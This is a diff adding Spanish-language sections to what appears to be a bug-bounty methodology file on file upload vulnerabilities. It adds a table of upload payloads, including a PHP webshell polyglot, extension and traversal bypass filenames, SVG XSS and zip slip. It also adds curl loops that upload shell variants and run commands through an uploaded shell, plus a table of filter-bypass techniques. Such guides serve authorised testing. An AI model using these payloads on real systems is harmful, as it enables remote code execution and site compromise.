@@ -106,6 +106,56 @@ chains_with: [broken-access-control, crlf-injection]
 - `binwalk` to inspect what a target's own "antivirus"/content scanner actually parses.
 - `ffuf` to brute-force the upload directory for predictable filenames if no URL is returned: `ffuf -u https://target.com/uploads/FUZZ.jpg -w wordlist.txt -mc 200`.
 
+## Payloads & Detection Patterns
+
+Guía de caza: una familia por capa de validación evadida. Un archivo almacenado no es finding: la
+severidad depende de recuperarlo y ejecutarlo (RCE) o de que dispare script en el origen (XSS).
+
+| Categoría | Shape | Propósito |
+|---|---|---|
+| Extension bypass | `shell.php.jpg`, `shell.pHp5`, `shell.phtml`, `shell.php%00.jpg`, `.htaccess` | Alcanzar un handler ejecutable pese al filtro de extensión |
+| Content-Type spoof | multipart `type=image/jpeg` sobre body PHP | Server confía en el `Content-Type` cliente, no sniffea |
+| Magic-byte polyglot | `GIF89a;<?php system($_GET["c"]);?>`, payload en EXIF `Comment` | Pasar validación de bytes iniciales manteniendo ejecución |
+| SVG/HTML stored XSS | `<svg onload=...>`, `<script>` en SVG servido inline | Script en el origen de la app (no `attachment`) |
+| Path traversal filename | `filename=../../../../var/www/html/shell.php`, `..%2f..%2f` | Escribir fuera del directorio de uploads |
+| ZIP slip | entrada de archivo `../../../../tmp/poc.txt` en el zip | Write arbitrario al extraer archivos subidos |
+| DoS/zip-bomb | archivo sobredimensionado o zip anidado (con cuidado, respetar scope) | Agotar recursos del parser/almacenamiento |
+
+Surface signals que delatan la clase antes de subir:
+- `<input type="file">`, avatar/CV/adjunto/import (CSV/XLSX), respuesta que devuelve URL directa al archivo.
+- Uploads servidos desde el mismo origen (no CDN/S3 aislado) → habilita XSS/webshell.
+- Librerías de procesamiento (ImageMagick, GraphicsMagick, Pillow) en errores/headers → polyglot/ImageTragick.
+- Ruta de almacenamiento predecible o incremental → recuperar el archivo subido para probar ejecución.
+
+```bash
+# barrido de bypass de extensión/MIME (marcador único en el payload para dedup)
+for fn in shell.php shell.PHP shell.php.jpg shell.pHp5 shell.phtml shell.php%00.jpg; do
+  echo "== $fn =="
+  curl -s -o /dev/null -w '%{http_code}\n' -F "file=@shell.php;filename=$fn;type=image/jpeg" \
+    https://target.com/upload
+done
+```
+
+```bash
+# confirmar ejecución, no solo almacenamiento (control: pedir el archivo subido)
+curl -s "https://target.com/uploads/polyglot.gif.php?c=id"      # payload: salida de id = RCE
+curl -s -I "https://target.com/uploads/benign.jpg"              # control: headers de servido
+```
+
+## Bypass Techniques
+
+Agrupadas por la validación que evaden; probar la familia completa antes de declarar no-ejecutable.
+
+| Filtro evadido | Técnica | Notas |
+|---|---|---|
+| Blocklist de extensión | Doble extensión, casing `.pHp`, alternas `.phtml`/`.php5`, null byte `%00` (stacks legacy) | Depende del mapeo de handler del server web |
+| Allowlist de extensión | `.htaccess` para re-registrar handler, SVG como "imagen" permitida | SVG servido inline → stored XSS aunque la extensión sea válida |
+| `Content-Type` sniffing | Prepend de header de imagen (GIF89a), payload en EXIF `Comment` | Mantener bytes mágicos válidos + código ejecutable |
+| Re-encoding de imagen | Payload en chunk que sobreviva el resize, o apuntar a endpoint sin re-encode | Si re-encodea, diffear bytes del archivo descargado antes de insistir |
+| Sanitización de filename | `../`, `..%2f`, `....//`, overlong UTF-8 en el nombre | Escribe fuera del dir si no normaliza antes del `join` |
+| `Content-Disposition: attachment` | Buscar endpoint/param que sirva inline, o path alterno sin el header | XSS colapsa si todo se sirve como `attachment` + `nosniff` |
+| Antivirus/scanner de contenido | Polyglot que el scanner no parsea pero el handler sí (ver `binwalk`) | Confirmar qué formato parsea realmente el scanner |
+
 ## Root Causes
 
 - Validation based on client-controlled `Content-Type` or filename extension alone, no server-side content sniffing (magic bytes) or re-encoding.
